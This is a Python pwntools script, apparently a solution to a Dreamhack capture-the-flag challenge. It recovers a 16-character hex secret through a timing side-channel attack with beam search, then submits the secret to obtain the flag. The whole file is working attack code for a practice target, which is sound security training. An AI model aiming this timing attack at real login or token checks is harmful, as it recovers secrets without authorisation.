import time
from pwn import *
import operator

# ================== CẤU HÌNH ==================
HOST = "host1.dreamhack.games"
PORT = 11625
context.log_level = 'error'

CHARSET = "0123456789abcdef"
SECRET_LEN = 16
NUM_SAMPLES = 10 # Cần đủ lớn để có tín hiệu
BEAM_WIDTH = 3 # Giữ lại 3 ứng cử viên tốt nhất ở mỗi bước

# ==============================================

log.info("Establishing a single, persistent connection...")
p = remote(HOST, PORT, timeout=10)

# Beam chứa các (chuỗi_ứng_viên, tổng_thời_gian)
beam = [("", 0)]

# Lặp qua từng vị trí
for i in range(SECRET_LEN):
    all_candidates = []
    print(f"\n[*] Expanding beam for position {i}")
    
    # Mở rộng từ các ứng viên hiện tại trong beam
    for prefix, _ in beam:
        for char_to_guess in CHARSET:
            test_input = prefix + char_to_guess + ('0' * (SECRET_LEN - 1 - i))
            
            total_duration = 0
            for _ in range(NUM_SAMPLES):
                try:
                    start_time = time.time()
                    p.sendline(test_input.encode())
                    p.recvuntil(b'\xf0\x9f\xa4\x94', timeout=5)
                    end_time = time.time()
                    total_duration += (end_time - start_time)
                except Exception:
                    # Nếu lỗi, coi như thời gian là 0 để loại bỏ
                    total_duration = -1
                    break
            
            if total_duration != -1:
                avg_duration = total_duration / NUM_SAMPLES
                all_candidates.append((prefix + char_to_guess, avg_duration))

    # Sắp xếp tất cả các ứng viên mới theo thời gian và chọn ra những cái tốt nhất
    all_candidates.sort(key=lambda x: x[1], reverse=True)
    
    # Cập nhật beam cho bước tiếp theo
    beam = all_candidates[:BEAM_WIDTH]
    
    print(f"    --- Top {BEAM_WIDTH} candidates ---")
    for candidate, timing in beam:
        print(f"    '{candidate}': {timing:.4f}")

# Chuỗi tốt nhất là chuỗi đầu tiên trong beam cuối cùng
best_secret = beam[0][0]

print("-" * 40)
log.success(f"Final secret found via Beam Search: {best_secret}")

# Gửi secret đúng để lấy flag bằng một kết nối MỚI
log.info("Sending the correct secret to get the flag...")
try:
    # Tạo một kết nối mới, sạch sẽ
    p_final = remote(HOST, PORT, timeout=10)
    p_final.sendline(best_secret.encode())
    flag = p_final.recvall(timeout=5).decode().strip()
    
    print("\n" + "="*20)
    log.success(f"FLAG: {flag}")
    print("="*20)
    
    p_final.close()
except Exception as e:
    log.error(f"Failed to get flag: {e}")